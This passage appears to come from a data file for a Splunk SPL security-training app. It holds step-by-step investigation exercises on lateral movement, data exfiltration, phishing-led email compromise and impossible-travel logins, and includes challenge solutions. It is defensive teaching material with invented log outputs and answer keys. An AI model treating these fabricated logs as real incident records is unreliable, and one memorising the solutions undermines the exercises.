                            columns: ['host', 'first', 'last', 'count'],
                            rows: [
                                { 'host': 'FILESRV-01', 'first': '2024-01-15 02:15:33', 'last': '2024-01-15 02:18:47', 'count': '3' },
                                { 'host': 'DC-CORP-01', 'first': '2024-01-15 02:22:15', 'last': '2024-01-15 03:47:22', 'count': '24' },
                                { 'host': 'SQLDB-PROD-01', 'first': '2024-01-15 03:12:08', 'last': '2024-01-15 03:45:19', 'count': '18' },
                                { 'host': 'BACKUP-01', 'first': '2024-01-15 03:48:55', 'last': '2024-01-15 04:02:33', 'count': '7' }
                            ]
                        },
                        finding: 'Movement chain identified: WKS-HR-022 → FILESRV-01 → DC-CORP-01 → SQLDB-PROD-01 → BACKUP-01. Attacker accessed domain controller and production database!'
                    },
                    {
                        question: 'Critical: Did the attacker access the domain controller? What actions were taken there?',
                        hint: 'Look for privileged actions on the DC from the compromised credentials.',
                        spl: 'index=wineventlog host="DC-CORP-01" TargetUserName="admin_jmorgan" earliest=-24h | stats count by EventCode | lookup wineventcode_lookup EventCode OUTPUT EventDescription | sort -count',
                        analysis: 'Shows what events the compromised account generated on the domain controller.',
                        output: {
                            columns: ['EventCode', 'EventDescription', 'count'],
                            rows: [
                                { 'EventCode': '4624', 'EventDescription': 'Successful logon', 'count': '24' },
                                { 'EventCode': '4672', 'EventDescription': 'Special privileges assigned', 'count': '24' },
                                { 'EventCode': '4728', 'EventDescription': 'Member added to security-enabled global group', 'count': '1' },
                                { 'EventCode': '4720', 'EventDescription': 'User account was created', 'count': '1' },
                                { 'EventCode': '4738', 'EventDescription': 'User account was changed', 'count': '1' }
                            ]
                        },
                        finding: 'CRITICAL: EventCode 4728 (member added to security group) and 4738 (user account changed) detected. Attacker may have created persistence!'
                    },
                    {
                        question: 'Identify any new accounts or group membership changes made by the attacker.',
                        hint: 'Look at account creation and group modification events.',
                        spl: 'index=wineventlog host="DC-CORP-01" EventCode IN (4720, 4728, 4732) earliest=-24h | table _time, EventCode, TargetUserName, SubjectUserName, GroupName | sort _time',
                        analysis: 'Shows account creation and group membership changes.',
                        output: {
                            columns: ['_time', 'EventCode', 'TargetUserName', 'SubjectUserName', 'GroupName'],
                            rows: [
                                { '_time': '2024-01-15 03:47:01', 'EventCode': '4720', 'TargetUserName': 'support_temp', 'SubjectUserName': 'admin_jmorgan', 'GroupName': '-' },
                                { '_time': '2024-01-15 03:47:15', 'EventCode': '4728', 'TargetUserName': 'support_temp', 'SubjectUserName': 'admin_jmorgan', 'GroupName': 'Domain Admins' }
                            ]
                        },
                        finding: 'Attacker created account "support_temp" and added it to "Domain Admins" group at 03:47 AM. This is a backdoor account!'
                    }
                ],
                conclusion: `<strong>Investigation Complete - CRITICAL INCIDENT</strong><br><br>
                    <strong>Confirmed Lateral Movement Path:</strong><br>
                    WKS-HR-022 → FILESRV-01 → DC-CORP-01 → SQLDB-PROD-01 → BACKUP-01<br><br>
                    <strong>Credentials Compromised:</strong> jmorgan, admin_jmorgan<br><br>
                    <strong>Persistence Established:</strong> Backdoor account "support_temp" added to Domain Admins<br><br>
                    <strong>IMMEDIATE ACTIONS:</strong>
                    <ol>
                        <li>Disable "support_temp" and "admin_jmorgan" accounts immediately</li>
                        <li>Force password reset for "jmorgan"</li>
                        <li>Isolate compromised workstation WKS-HR-022</li>
                        <li>Scan all accessed systems for malware/backdoors</li>
                        <li>Engage IR team - domain controller compromise requires full investigation</li>
                        <li>Check SQLDB-PROD-01 for data access/exfiltration</li>
                    </ol>`
            }
        },
        {
            id: 'int-003',
            title: 'Data Exfiltration Analysis',
            type: 'scenario',
            difficulty: 'intermediate',
            duration: '25 min',
            objectives: [
                'Identify abnormal data transfers',
                'Calculate baseline deviations',
                'Correlate network and endpoint data'
            ],
            tags: ['network', 'exfiltration', 'dlp'],
            description: 'Investigate suspected data exfiltration through unusual outbound transfers.',
            content: {
                situation: `DLP system flagged "possible data exfiltration" for user account "mchen" but has limited details. Your firewall and proxy logs should reveal if sensitive data left the network.`,
                steps: [
                    {
                        question: 'First, understand mchen\'s normal data transfer patterns. What\'s their baseline?',
                        hint: 'Calculate average daily outbound bytes for this user over the past 30 days.',
                        spl: 'index=proxy user="mchen" earliest=-30d latest=-1d | bin _time span=1d | stats sum(bytes_out) as daily_bytes by _time | stats avg(daily_bytes) as avg_daily, stdev(daily_bytes) as stdev_daily, max(daily_bytes) as max_daily',
                        analysis: 'Establish baseline transfer patterns.',
                        output: {
                            columns: ['avg_daily', 'stdev_daily', 'max_daily'],
                            rows: [
                                { 'avg_daily': '157286400', 'stdev_daily': '47185920', 'max_daily': '293601280' }
                            ],
                            note: '(avg: ~150MB, stdev: ~45MB, max: ~280MB)'
                        },
                        finding: 'Baseline: Average 150MB/day, std dev 45MB, max 280MB. Anything significantly above 300MB would be anomalous.'
                    },
                    {
                        question: 'Now check today\'s activity. How does it compare to baseline?',
                        hint: 'Sum today\'s outbound bytes and compare to the baseline we just established.',
                        spl: 'index=proxy user="mchen" earliest=@d | stats sum(bytes_out) as today_bytes | eval today_MB=round(today_bytes/1024/1024, 2) | eval baseline_avg_MB=150, anomaly_threshold_MB=300 | eval status=if(today_MB>anomaly_threshold_MB, "ANOMALOUS", "NORMAL")',
                        analysis: 'Compare today to baseline.',
                        output: {
                            columns: ['today_bytes', 'today_MB', 'baseline_avg_MB', 'anomaly_threshold_MB', 'status'],
                            rows: [
                                { 'today_bytes': '2469606195', 'today_MB': '2355.20', 'baseline_avg_MB': '150', 'anomaly_threshold_MB': '300', 'status': 'ANOMALOUS' }
                            ]
                        },
                        finding: 'ANOMALOUS: User mchen has transferred 2.3GB today - 15x their normal average!'
                    },
                    {
                        question: 'Where is this data going? Identify the top destinations.',
                        hint: 'Group outbound traffic by destination domain or IP.',
                        spl: 'index=proxy user="mchen" earliest=@d | stats sum(bytes_out) as bytes by dest_domain | sort -bytes | eval MB=round(bytes/1024/1024, 2) | head 10',
                        analysis: 'Identify where data is being sent.',
                        output: {
                            columns: ['dest_domain', 'bytes', 'MB'],
                            rows: [
                                { 'dest_domain': 'mega.nz', 'bytes': '2202009600', 'MB': '2100.00' },
                                { 'dest_domain': 'drive.google.com', 'bytes': '125829120', 'MB': '120.00' },
                                { 'dest_domain': 'pastebin.com', 'bytes': '47185920', 'MB': '45.00' },
                                { 'dest_domain': 'outlook.office365.com', 'bytes': '52428800', 'MB': '50.00' }
                            ],
                            truncated: 'Showing 4 of 10 results'
                        },
                        finding: 'Top destination: mega.nz (cloud storage) with 2.1GB. Also: drive.google.com (120MB), pastebin.com (45MB). These are file-sharing services!'
                    },
                    {
                        question: 'What files or content type is being uploaded to these services?',
                        hint: 'Look at content types, file extensions, or request patterns in proxy logs.',
                        spl: 'index=proxy user="mchen" dest_domain IN ("mega.nz", "drive.google.com") action=upload | stats count, sum(bytes_out) as bytes by content_type, filename | sort -bytes',
                        analysis: 'Identify what types of files are being exfiltrated.',
                        output: {
                            columns: ['content_type', 'filename', 'count', 'bytes'],
                            rows: [
                                { 'content_type': 'application/zip', 'filename': 'Customer_Database_Export.zip', 'count': '1', 'bytes': '1258291200' },
                                { 'content_type': 'application/vnd.ms-excel', 'filename': 'Q4_Financial_Report.xlsx', 'count': '1', 'bytes': '524288000' },
                                { 'content_type': 'application/vnd.ms-powerpoint', 'filename': 'Strategy_2024.pptx', 'count': '1', 'bytes': '314572800' },
                                { 'content_type': 'application/pdf', 'filename': 'Employee_Directory.pdf', 'count': '1', 'bytes': '104857600' }
                            ]
                        },
                        finding: 'Uploaded files include: "Q4_Financial_Report.xlsx", "Customer_Database_Export.zip", "Strategy_2024.pptx". These are clearly sensitive documents!'
                    },
                    {
                        question: 'Timeline the exfiltration. When did it happen and was it during work hours?',
                        hint: 'Create a timeline of the suspicious uploads.',
                        spl: 'index=proxy user="mchen" dest_domain="mega.nz" action=upload | timechart span=1h sum(bytes_out) as bytes_uploaded | eval MB=round(bytes_uploaded/1024/1024, 2)',
                        analysis: 'Shows when the uploads occurred.',
                        output: {
                            columns: ['_time', 'bytes_uploaded', 'MB'],
                            rows: [
                                { '_time': '2024-01-15 23:00', 'bytes_uploaded': '524288000', 'MB': '500.00' },
                                { '_time': '2024-01-16 00:00', 'bytes_uploaded': '838860800', 'MB': '800.00' },
                                { '_time': '2024-01-16 01:00', 'bytes_uploaded': '629145600', 'MB': '600.00' },
                                { '_time': '2024-01-16 02:00', 'bytes_uploaded': '209715200', 'MB': '200.00' }
                            ]
                        },
                        finding: 'Bulk uploads occurred between 11 PM and 2 AM - outside business hours. User may have tried to avoid detection.'
                    }
                ],
                conclusion: `<strong>Investigation Complete - CONFIRMED EXFILTRATION</strong><br><br>
                    <strong>Volume:</strong> 2.3GB transferred to personal cloud storage (mega.nz)<br><br>
                    <strong>Sensitive Files Identified:</strong>
                    <ul>
                        <li>Q4_Financial_Report.xlsx</li>
                        <li>Customer_Database_Export.zip</li>
                        <li>Strategy_2024.pptx</li>
                    </ul><br>
                    <strong>Timing:</strong> 11 PM - 2 AM (outside business hours)<br><br>
                    <strong>Recommended Actions:</strong>
                    <ol>
                        <li>Preserve all evidence (proxy logs, endpoint forensics)</li>
                        <li>Engage HR and Legal immediately - this is a policy violation</li>
                        <li>Suspend mchen's network access pending investigation</li>
                        <li>Block mega.nz at proxy level</li>
                        <li>Determine if mchen gave notice or has reason for data collection</li>
                        <li>Prepare for potential law enforcement involvement</li>
                    </ol>`
            }
        },
        {
            id: 'int-004',
            title: 'Lookup Enrichment',
            type: 'challenge',
            difficulty: 'intermediate',
            duration: '15 min',
            objectives: [
                'Use lookup tables to add context',
                'Enrich security events with asset data',
                'Handle lookup mismatches'
            ],
            tags: ['lookups', 'enrichment', 'context'],
            description: 'Add business context to security events using lookup tables.',
            content: {
                problem: 'Enrich firewall events with asset information. For each source IP, add the hostname, department, and owner from the asset_inventory lookup. Flag any IPs that are NOT in the asset inventory as "Unknown Asset".',
                hints: [
                    'Use the lookup command to enrich events',
                    'Use OUTPUT to specify which fields to add',
                    'Use eval with if/isnull to handle missing lookups'
                ],
                solution: {
                    spl: 'index=firewall | lookup asset_inventory ip as src_ip OUTPUT hostname, department, owner | eval hostname=if(isnull(hostname), "Unknown Asset", hostname) | eval department=if(isnull(department), "INVESTIGATE", department) | stats count by src_ip, hostname, department, owner | sort -count',
                    explanation: 'The lookup command matches src_ip to the ip field in asset_inventory and adds hostname, department, and owner. We then use eval with isnull() to flag unknown assets that need investigation.'
                },
                variations: [
                    {
                        description: 'Enrich with threat intelligence and flag malicious IPs:',
                        spl: 'index=firewall | lookup threat_intel_ip ip as dest_ip OUTPUT threat_type, severity | where isnotnull(threat_type) | stats count by dest_ip, threat_type, severity'
                    },
                    {
                        description: 'Add GeoIP data and find connections to unusual countries:',
                        spl: 'index=firewall | iplocation dest_ip | stats count, sum(bytes_out) as bytes by dest_country | sort -bytes'
                    }
                ]
            }
        },
        {
            id: 'int-005',
            title: 'Transaction Building',
            type: 'challenge',
            difficulty: 'intermediate',
            duration: '20 min',
            objectives: [
                'Group related events into transactions',
                'Calculate session duration',
                'Identify incomplete transactions'
            ],
            tags: ['transaction', 'sessions', 'correlation'],
            description: 'Learn to group related events together using the transaction command.',
            content: {
                problem: 'Build VPN sessions from individual events. Group events by username, where a session starts with action="connect" and ends with action="disconnect". Calculate session duration and find any sessions longer than 8 hours.',
                hints: [
                    'Transaction groups events with common field values',
                    'startswith and endswith define session boundaries',
                    'Transaction automatically calculates duration'
                ],
                solution: {
                    spl: 'index=vpn | transaction user startswith=(action="connect") endswith=(action="disconnect") | where duration > 28800 | eval hours=round(duration/3600, 2) | table user, duration, hours, eventcount, _time',
                    explanation: 'Transaction groups VPN events by user, creating sessions that start with connect and end with disconnect. The duration field (in seconds) is automatically calculated. We filter to sessions over 8 hours (28800 seconds) which may indicate forgotten sessions or policy violations.'
                },
                variations: [
                    {
                        description: 'Find web sessions with more than 100 page views:',
                        spl: 'index=web | transaction session_id maxspan=30m | where eventcount > 100 | stats count by user, eventcount, duration'
                    },
                    {
                        description: 'Find incomplete VPN sessions (no disconnect):',
                        spl: 'index=vpn | transaction user startswith=(action="connect") endswith=(action="disconnect") maxspan=12h | where NOT closed_txn | table user, _time, eventcount'
                    }
                ]
            }
        },
        {
            id: 'int-006',
            title: 'Correlating Data Sources',
            type: 'tutorial',
            difficulty: 'intermediate',
            duration: '25 min',
            objectives: [
                'Choose the right correlation technique',
                'Combine data from multiple indexes',
                'Enrich events with context from other sources'
            ],
            tags: ['correlation', 'join', 'append', 'lookup', 'enrichment'],
            description: 'Learn to combine data from different sources - a critical skill for security investigations.',
            content: {
                sections: [
                    {
                        title: 'Why Correlate?',
                        body: `<p>Real investigations require data from multiple sources:</p>
                        <ul>
                            <li>Auth logs + Endpoint logs = Who did what on which machine</li>
                            <li>Firewall + Proxy = Complete picture of network activity</li>
                            <li>Events + Asset inventory = Business context</li>
                        </ul>
                        <p>SPL offers several ways to combine data. Choosing the right one matters for both correctness and performance.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'Method 1: Subsearch (for filtering)',
                        body: `<p>Use subsearch when you want to <strong>filter</strong> one dataset based on another:</p>
                        <p><em>"Show me web activity from IPs that had failed logins"</em></p>`,
                        spl: `index=web [search index=auth action=failure | stats count by src_ip | where count > 10 | fields src_ip]
| stats count by src_ip, uri_path`,
                        explanation: 'Subsearch finds IPs with >10 failed logins, main search filters web logs to those IPs. Fast, but limited to ~10K results from subsearch.'
                    },
                    {
                        title: 'Method 2: Join (for combining fields)',
                        body: `<p>Use join when you need to <strong>add fields</strong> from one dataset to another:</p>
                        <p><em>"Add user department to authentication events"</em></p>`,
                        spl: `index=auth action=failure
| join type=left user [search index=hr_data | fields user, department, manager]
| stats count by user, department`,
                        explanation: 'Left join keeps all auth events, adds department from HR data where user matches. Missing matches get null values.'
                    },
                    {
                        title: 'Method 3: Lookup (for enrichment)',
                        body: `<p>Use lookup for <strong>static reference data</strong> - it's faster than join:</p>
                        <p><em>"Add threat intel context to firewall events"</em></p>`,
                        spl: `index=firewall
| lookup threat_intel.csv ip as dest_ip OUTPUT threat_type, severity, description
| where isnotnull(threat_type)
| stats count by dest_ip, threat_type, severity`,
                        explanation: 'Lookups are optimized for enrichment from CSV files. Much faster than joining to a search.'
                    },
                    {
                        title: 'Method 4: Append (for stacking)',
                        body: `<p>Use append when you want to <strong>combine rows</strong> from different searches:</p>
                        <p><em>"Show all login failures from both Windows and Linux"</em></p>`,
                        spl: `index=wineventlog EventCode=4625 | stats count by user, src_ip | eval source="windows"
| append [search index=linux_secure "authentication failure" | stats count by user, src_ip | eval source="linux"]
| stats sum(count) as total_failures by user, src_ip`,
                        explanation: 'Append stacks results vertically. Use when combining similar data from different indexes.'
                    },
                    {
                        title: 'Method 5: Union (for combining with normalization)',
                        body: `<p>Use union when datasets have <strong>different field names</strong>:</p>`,
                        spl: `| union
    [search index=proxy | fields _time, user, url as target, bytes]
    [search index=firewall | fields _time, user, dest_ip as target, bytes_out as bytes]
| stats sum(bytes) by user, target`,
                        explanation: 'Union is like append but better handles field name differences. Normalizes at query time.'
                    },
                    {
                        title: 'Decision Guide',
                        body: `<table style="width:100%; border-collapse: collapse; margin: 10px 0;">
                            <tr style="background: rgba(255,255,255,0.1);"><td style="padding:8px; border:1px solid #444;"><strong>Need</strong></td><td style="padding:8px; border:1px solid #444;"><strong>Use</strong></td><td style="padding:8px; border:1px solid #444;"><strong>Performance</strong></td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Filter events by values from another search</td><td style="padding:8px; border:1px solid #444;">Subsearch</td><td style="padding:8px; border:1px solid #444;">Good (if <10K values)</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Add fields from static CSV file</td><td style="padding:8px; border:1px solid #444;">Lookup</td><td style="padding:8px; border:1px solid #444;">Excellent</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Add fields from another search</td><td style="padding:8px; border:1px solid #444;">Join</td><td style="padding:8px; border:1px solid #444;">Moderate (memory heavy)</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Stack rows from different sources</td><td style="padding:8px; border:1px solid #444;">Append/Union</td><td style="padding:8px; border:1px solid #444;">Good</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">Compare datasets (what's in A not B)</td><td style="padding:8px; border:1px solid #444;">set diff</td><td style="padding:8px; border:1px solid #444;">Good</td></tr>
                        </table>`,
                        spl: null,
                        explanation: null
                    }
                ]
            }
        },
        {
            id: 'int-007',
            title: 'Phishing Investigation',
            type: 'scenario',
            difficulty: 'intermediate',
            duration: '30 min',
            objectives: [
                'Trace phishing email to endpoint activity',
                'Identify affected users and systems',
                'Determine scope of compromise'
            ],
            tags: ['phishing', 'email', 'endpoint', 'incident-response'],
            description: 'Investigate a reported phishing email and determine if anyone clicked.',
            content: {
                situation: `A user reports a suspicious email with subject "Urgent: Update Your Password" containing a link to "secure-login-update[.]com". Security received the report 2 hours after the email was sent. You need to determine how many users received it, who clicked, and if any systems are compromised.`,
                steps: [
                    {
                        question: 'First, find all recipients of this phishing email in the mail logs.',
                        hint: 'Search email logs for the subject line or sender domain.',
                        spl: 'index=email subject="*Urgent*Update Your Password*" OR sender_domain="*secure-login-update*" | stats count by recipient, sender, subject, _time | sort _time',
                        analysis: 'Identify all recipients to understand the scope of the campaign.',
                        output: {
                            columns: ['recipient', 'sender', 'subject', '_time'],
                            rows: [
                                { 'recipient': 'jsmith@company.com', 'sender': 'it-support@secure-login-update.com', 'subject': 'Urgent: Update Your Password', '_time': '2024-01-15 09:15:22' },
                                { 'recipient': 'mwilson@company.com', 'sender': 'it-support@secure-login-update.com', 'subject': 'Urgent: Update Your Password', '_time': '2024-01-15 09:15:24' },
                                { 'recipient': 'pjones@company.com', 'sender': 'it-support@secure-login-update.com', 'subject': 'Urgent: Update Your Password', '_time': '2024-01-15 09:15:25' },
                                { 'recipient': 'rthompson@company.com', 'sender': 'it-support@secure-login-update.com', 'subject': 'Urgent: Update Your Password', '_time': '2024-01-15 09:15:27' },
                                { 'recipient': 'admin@company.com', 'sender': 'it-support@secure-login-update.com', 'subject': 'Urgent: Update Your Password', '_time': '2024-01-15 09:15:28' }
                            ],
                            truncated: 'Showing 5 of 47 recipients'
                        },
                        finding: '47 employees received the phishing email within a 2-minute window at 9:15 AM. This was a targeted campaign against the organization.'
                    },
                    {
                        question: 'Check proxy logs - did anyone click the malicious link?',
                        hint: 'Look for the phishing domain in web proxy logs.',
                        spl: 'index=proxy url="*secure-login-update*" | stats count, values(url) as urls by user, src_ip, _time | sort _time',
                        analysis: 'Proxy logs show who visited the malicious domain.',
                        output: {
                            columns: ['user', 'src_ip', 'urls', '_time', 'count'],
                            rows: [
                                { 'user': 'mwilson', 'src_ip': '10.10.25.44', 'urls': 'https://secure-login-update.com/portal/login.php', '_time': '2024-01-15 09:23:17', 'count': '3' },
                                { 'user': 'pjones', 'src_ip': '10.10.32.18', 'urls': 'https://secure-login-update.com/portal/login.php', '_time': '2024-01-15 09:45:08', 'count': '1' }
                            ]
                        },
                        finding: 'Two users clicked the link: mwilson (3 visits) and pjones (1 visit). mwilson accessed it 8 minutes after receiving the email.'
                    },
                    {
                        question: 'Did the users submit credentials? Look for POST requests or form submissions.',
                        hint: 'Filter proxy logs for POST method or content submission to the phishing site.',
                        spl: 'index=proxy url="*secure-login-update*" http_method=POST | table _time, user, src_ip, url, bytes_out, content_type',
                        analysis: 'POST requests with data submission indicate credential entry.',
                        output: {
                            columns: ['_time', 'user', 'src_ip', 'url', 'bytes_out', 'content_type'],
                            rows: [
                                { '_time': '2024-01-15 09:24:02', 'user': 'mwilson', 'src_ip': '10.10.25.44', 'url': 'https://secure-login-update.com/portal/submit.php', 'bytes_out': '847', 'content_type': 'application/x-www-form-urlencoded' }
                            ]
                        },
                        finding: 'CRITICAL: mwilson submitted data (847 bytes) to the phishing site. Credentials are likely compromised. pjones clicked but did not submit.'
                    },
                    {
                        question: 'Check for post-compromise activity. Did anyone authenticate using mwilson\'s credentials from an unusual location?',
                        hint: 'Look for authentication events for the compromised user from IPs other than their workstation.',
                        spl: 'index=auth user="mwilson" action=success earliest="01/15/2024:09:24:00" | where src_ip!="10.10.25.44" | stats count by src_ip, app, action, _time',
                        analysis: 'Look for successful logins from IPs other than the user\'s workstation.',
                        output: {
                            columns: ['src_ip', 'app', 'action', '_time', 'count'],
                            rows: [
                                { 'src_ip': '185.220.101.54', 'app': 'OWA', 'action': 'success', '_time': '2024-01-15 09:31:15', 'count': '1' },
                                { 'src_ip': '185.220.101.54', 'app': 'VPN', 'action': 'success', '_time': '2024-01-15 09:35:42', 'count': '1' }
                            ]
                        },
                        finding: 'CONFIRMED COMPROMISE: Within 7 minutes of credential theft, attacker logged into OWA and VPN from IP 185.220.101.54 (located in Netherlands based on GeoIP).'
                    },
                    {
                        question: 'What did the attacker do after gaining access? Check email and file access.',
                        hint: 'Look for email forwarding rules, sent emails, or file downloads from the compromised account.',
                        spl: 'index=email (sender="mwilson@company.com" OR mailbox_rule_created=*) earliest="01/15/2024:09:30:00" | eval activity=coalesce(mailbox_rule_created, "sent email") | stats count by activity, recipient, subject | head 10',
                        analysis: 'Check for data exfiltration or further phishing from compromised account.',
                        output: {
                            columns: ['activity', 'recipient', 'subject', 'count'],
                            rows: [
                                { 'activity': 'forward-to: attacker@protonmail.com', 'recipient': '-', 'subject': '-', 'count': '1' },
                                { 'activity': 'sent email', 'recipient': 'finance-team@company.com', 'subject': 'Re: Q4 Wire Transfer', 'count': '1' },
                                { 'activity': 'sent email', 'recipient': 'ceo@company.com', 'subject': 'Urgent: Account Access Required', 'count': '1' }
                            ]
                        },
                        finding: 'Attacker created a forwarding rule to protonmail.com and sent targeted emails to finance team and CEO. This is Business Email Compromise (BEC) in progress!'
                    }
                ],
                conclusion: `<strong>Investigation Complete - Active Incident</strong><br><br>
                    <strong>Timeline:</strong><br>
                    <ul>
                        <li>9:15 AM - Phishing email sent to 47 employees</li>
                        <li>9:23 AM - mwilson clicks link</li>
                        <li>9:24 AM - mwilson submits credentials</li>
                        <li>9:31 AM - Attacker logs into OWA from Netherlands</li>
                        <li>9:35 AM - Attacker accesses VPN</li>
                        <li>9:40 AM - Email forwarding rule created, BEC emails sent</li>
                    </ul><br>
                    <strong>Immediate Actions Required:</strong>
                    <ol>
                        <li>Disable mwilson's account immediately</li>
                        <li>Remove the malicious forwarding rule</li>
                        <li>Alert finance team and CEO about fraudulent emails</li>
                        <li>Block IP 185.220.101.54 and domain secure-login-update.com</li>
                        <li>Force password reset for mwilson</li>
                        <li>Review all emails sent from mwilson's account since 9:30 AM</li>
                        <li>Check pjones workstation for any compromise (clicked but didn't submit)</li>
                    </ol>`
            }
        },
        {
            id: 'int-008',
            title: 'Impossible Travel Detection',
            type: 'scenario',
            difficulty: 'intermediate',
            duration: '25 min',
            objectives: [
                'Detect geographically impossible logins',
                'Calculate travel velocity',
                'Distinguish legitimate from suspicious patterns'
            ],
            tags: ['authentication', 'geo', 'account-compromise', 'travel'],
            description: 'Find users authenticating from locations too far apart to travel between.',
            content: {
                situation: `Your organization has users worldwide, but you've been asked to detect "impossible travel" - when a user logs in from two geographic locations so far apart that physical travel between them in the time span would be impossible. This often indicates credential theft.`,
                steps: [
                    {
                        question: 'First, let\'s get authentication events with geolocation data and calculate time between consecutive logins per user.',
                        hint: 'Use iplocation to get geo data, then streamstats to calculate time delta.',
                        spl: 'index=auth action=success | iplocation src_ip | where isnotnull(Country) | sort user, _time | streamstats window=2 current=t earliest(_time) as prev_time, earliest(City) as prev_city, earliest(Country) as prev_country, earliest(lat) as prev_lat, earliest(lon) as prev_lon by user | where isnotnull(prev_time) AND prev_time != _time',
                        analysis: 'Get consecutive logins per user with their geographic coordinates.',
                        output: {
                            columns: ['_time', 'user', 'City', 'Country', 'prev_city', 'prev_country'],
                            rows: [
                                { '_time': '2024-01-15 14:23:17', 'user': 'jsmith', 'City': 'New York', 'Country': 'United States', 'prev_city': 'London', 'prev_country': 'United Kingdom' },
                                { '_time': '2024-01-15 09:45:33', 'user': 'mwilson', 'City': 'Chicago', 'Country': 'United States', 'prev_city': 'Chicago', 'prev_country': 'United States' },
                                { '_time': '2024-01-15 11:22:08', 'user': 'pjones', 'City': 'Tokyo', 'Country': 'Japan', 'prev_city': 'San Francisco', 'prev_country': 'United States' }
                            ],
                            truncated: 'Showing 3 of 1,247 login pairs'
                        },
                        finding: 'We now have consecutive logins per user with geographic info. Need to calculate distances and travel time.'
                    },
                    {
                        question: 'Calculate the distance between consecutive logins and the time elapsed. Flag physically impossible travel.',
                        hint: 'Use the Haversine formula or a distance approximation. 500 mph is a reasonable max air travel speed.',
                        spl: `index=auth action=success | iplocation src_ip | where isnotnull(lat) | sort user, _time
| streamstats window=2 current=t earliest(_time) as prev_time, earliest(lat) as prev_lat, earliest(lon) as prev_lon, earliest(City) as prev_city by user
| where isnotnull(prev_time) AND prev_time != _time
| eval time_hours = (_time - prev_time) / 3600
| eval distance_km = 6371 * acos(cos(pi()/180 * lat) * cos(pi()/180 * prev_lat) * cos(pi()/180 * (lon - prev_lon)) + sin(pi()/180 * lat) * sin(pi()/180 * prev_lat))
| eval required_speed_kmh = distance_km / time_hours
| where required_speed_kmh > 800
| table _time, user, prev_city, City, time_hours, distance_km, required_speed_kmh`,
                        analysis: 'Calculate required travel speed. Flag if >800 km/h (faster than commercial flight).',
                        output: {
                            columns: ['_time', 'user', 'prev_city', 'City', 'time_hours', 'distance_km', 'required_speed_kmh'],
                            rows: [
                                { '_time': '2024-01-15 14:23:17', 'user': 'jsmith', 'prev_city': 'London', 'City': 'New York', 'time_hours': '0.5', 'distance_km': '5570', 'required_speed_kmh': '11140' },
                                { '_time': '2024-01-15 11:22:08', 'user': 'pjones', 'prev_city': 'San Francisco', 'City': 'Tokyo', 'time_hours': '2.3', 'distance_km': '8270', 'required_speed_kmh': '3596' }
                            ]
                        },
                        finding: 'Two impossible travel events detected: jsmith (London→NYC in 30 min = 11,140 km/h!) and pjones (SFO→Tokyo in 2.3 hours = 3,596 km/h). Both physically impossible.'
                    },
                    {
                        question: 'Filter out VPN and known proxy IPs that might cause false positives.',
                        hint: 'Exclude corporate VPN egress points and cloud provider IPs.',
                        spl: `index=auth action=success | iplocation src_ip | where isnotnull(lat)
| search NOT src_ip IN ("203.0.113.*", "198.51.100.*")
| sort user, _time
| streamstats window=2 current=t earliest(_time) as prev_time, earliest(lat) as prev_lat, earliest(lon) as prev_lon, earliest(City) as prev_city, earliest(src_ip) as prev_ip by user
| where isnotnull(prev_time) AND prev_time != _time
| eval time_hours = (_time - prev_time) / 3600
| eval distance_km = 6371 * acos(cos(pi()/180 * lat) * cos(pi()/180 * prev_lat) * cos(pi()/180 * (lon - prev_lon)) + sin(pi()/180 * lat) * sin(pi()/180 * prev_lat))
| where distance_km > 500 AND time_hours < 1
| table _time, user, prev_city, prev_ip, City, src_ip, time_hours, distance_km`,
                        analysis: 'Exclude VPN ranges and require significant distance (>500km) in short time (<1hr).',
                        output: {
                            columns: ['_time', 'user', 'prev_city', 'prev_ip', 'City', 'src_ip', 'time_hours', 'distance_km'],
                            rows: [
                                { '_time': '2024-01-15 14:23:17', 'user': 'jsmith', 'prev_city': 'London', 'prev_ip': '51.148.23.99', 'City': 'New York', 'src_ip': '74.125.23.100', 'time_hours': '0.5', 'distance_km': '5570' }
                            ]
                        },
                        finding: 'After filtering VPN IPs, jsmith remains flagged. pjones was using corporate VPN (false positive). Focus investigation on jsmith.'
                    },
                    {
                        question: 'Investigate jsmith\'s account - is this a compromised credential or legitimate activity?',
                        hint: 'Check login patterns, user agent, and whether both sessions were active simultaneously.',
                        spl: `index=auth user="jsmith" earliest="01/15/2024:13:00:00" latest="01/15/2024:15:00:00"
| iplocation src_ip
| stats count, values(action) as actions, values(user_agent) as agents, values(app) as apps by src_ip, City, Country
| sort -count`,
                        analysis: 'Look for anomalies in the login pattern and user agents.',
                        output: {
                            columns: ['src_ip', 'City', 'Country', 'actions', 'agents', 'apps', 'count'],
                            rows: [
                                { 'src_ip': '51.148.23.99', 'City': 'London', 'Country': 'United Kingdom', 'actions': 'success', 'agents': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'apps': 'Outlook, SharePoint', 'count': '12' },
                                { 'src_ip': '74.125.23.100', 'City': 'New York', 'Country': 'United States', 'actions': 'success', 'agents': 'Python-urllib/3.9', 'apps': 'API', 'count': '47' }
                            ]
                        },
                        finding: 'SUSPICIOUS: London IP uses normal browser for Outlook/SharePoint. NYC IP uses Python script for API access (47 calls in 2 hours). Different user agents + simultaneous sessions = likely credential theft.'
                    },
                    {
                        question: 'What was the suspicious NYC session accessing?',
                        hint: 'Look at API calls and data access patterns.',
                        spl: 'index=api_access user="jsmith" src_ip="74.125.23.100" | stats count by endpoint, http_method, response_code | sort -count',
                        analysis: 'Identify what data the suspicious session was accessing.',
                        output: {
                            columns: ['endpoint', 'http_method', 'response_code', 'count'],
                            rows: [
                                { 'endpoint': '/api/v1/users/list', 'http_method': 'GET', 'response_code': '200', 'count': '15' },
                                { 'endpoint': '/api/v1/contacts/export', 'http_method': 'GET', 'response_code': '200', 'count': '12' },
                                { 'endpoint': '/api/v1/documents/search', 'http_method': 'GET', 'response_code': '200', 'count': '20' }
                            ]
                        },
                        finding: 'Attacker is using API to enumerate users, export contacts, and search documents. This is systematic data exfiltration using stolen credentials.'
                    }
                ],
                conclusion: `<strong>Investigation Complete - Credential Compromise Confirmed</strong><br><br>
                    <strong>Finding:</strong> jsmith's credentials are being used simultaneously from London (legitimate) and New York (attacker).<br><br>
                    <strong>Evidence:</strong>
                    <ul>
                        <li>Impossible travel: London → NYC in 30 minutes</li>
